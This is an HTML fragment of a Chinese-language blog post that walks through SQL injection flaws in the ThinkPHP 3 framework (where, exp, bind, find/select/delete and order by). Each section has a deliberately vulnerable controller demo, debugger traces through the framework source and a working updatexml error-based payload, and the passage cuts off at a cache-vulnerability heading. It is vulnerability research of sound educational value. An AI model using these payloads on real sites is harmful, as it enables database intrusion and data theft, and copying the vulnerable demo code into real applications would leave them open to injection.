    <content type="html"><![CDATA[<h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a><strong>where注入</strong></h4><p>在控制器中，写个demo，利用字符串方式作为where传参时存在注入</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id='</span><span class="token punctuation">.</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'get'</span>     <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'post'</span>    <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'put'</span>     <span class="token punctuation">:</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>            <span class="token punctuation">}</span>            <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'param'</span>   <span class="token punctuation">:</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_POST</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>                    <span class="token punctuation">}</span>                    <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>重点看过滤函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg" alt="" loading="lazy"></p><p>先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在where方法中，将$where的值放入到options[“where”]数组中</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png" alt="" loading="lazy"></p><p>继续跟进查看find方法，第748行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$options</span>     <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在数组$options中增加’table’=&gt;’tp_user’，’model’=&gt;’User’，随后F7跟进select方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildSelectSql</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png" alt="" loading="lazy"></p><p>这里主要查看parseWhere方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png" alt="" loading="lazy"></p><p>跟进parseThinkWhere方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseThinkWhere</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span>   <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'_string'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 字符串模式查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'_complex'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 复合查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span></code></pre><p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为</p><pre><code>1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png" alt="" loading="lazy"></p><h4 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a><strong>exp注入</strong></h4><p>漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$User</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'id'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$User</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>直接在$user进行断点，F7跟进，跳过where方法，跟进find-&gt;select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png" alt="" loading="lazy"></p><p>跟进parseWhereItem方法，此时参数$val为一个数组，{‘exp’,’sql注入exp’}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png" alt="" loading="lazy"></p><p>此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为</p><pre><code>id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png" alt="" loading="lazy"></p><p>上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a><strong>bind注入</strong></h4><p>漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$uname</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>F8跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png" alt="" loading="lazy"></p><p>生成sql语句在update方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$table</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>   <span class="token operator">=</span> <span class="token string">'UPDATE '</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseSet</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 多表更新支持JOIN操作</span>            <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//  单表更新支持order和lmit</span>            <span class="token variable">$sql</span>   <span class="token punctuation">.</span><span class="token operator">=</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>在parseSet方法中，可以将传入的参数替换成:0</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png" alt="" loading="lazy"></p><p>在bindParam方法中，$this-&gt;bind属性返回array(‘:0’=&gt;参数值)</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bind</span><span class="token punctuation">[</span><span class="token string">':'</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进parseWhere-&gt;parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png" alt="" loading="lazy"></p><p>由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png" alt="" loading="lazy"></p><p>所以最终的payload为</p><pre><code>id[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxing</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png" alt="" loading="lazy"></p><h4 id="find-select-delete注入"><a href="#find-select-delete注入" class="headerlink" title="find/select/delete注入"></a><strong>find/select/delete注入</strong></h4><p>先分析find注入，在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当传入id[where]=1p时候，在user进行断点，F7跟进find-&gt;_parseOptions方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png" alt="" loading="lazy"></p><p>$options[‘where’]为字符串，导致不能执行_parseType方法转化数据，进行跟进select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere方法，传入的$where为字符串，直接执行了if语句</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 直接使用字符串条件</span>            <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whereStr</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">''</span><span class="token punctuation">:</span><span class="token string">' WHERE '</span><span class="token punctuation">.</span><span class="token variable">$whereStr</span><span class="token punctuation">;</span></code></pre><p>当传入id=1p，就不能进行注入了，具体原因在find-&gt;_parseOptions-&gt;_parseType方法，将传入的参数进行了强转化为整形</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png" alt="" loading="lazy"></p><p>所以，payload为</p><pre><code>?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png" alt="" loading="lazy"></p><p>select和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果条件为空 不进行删除操作 除非设置 1=1</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$pkValue</span>            <span class="token operator">=</span>  <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_before_delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>   </code></pre><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h4><p>先在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'eq'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">order</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'order'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在user变量处断点，F7跟进，find-&gt;select-&gt;buildSelectSql-&gt;parseSql方法</p><pre class=" language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre><p>当$options[‘order’]参数参在时，跟进parseOrder方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png" alt="" loading="lazy"></p><p>当不为数组时，直接返回order by + 注入pyload，所以注入payload为</p><pre><code>order=id and(updatexml(1,concat(0x7e,(select user())),0))</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png" alt="" loading="lazy"></p><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" 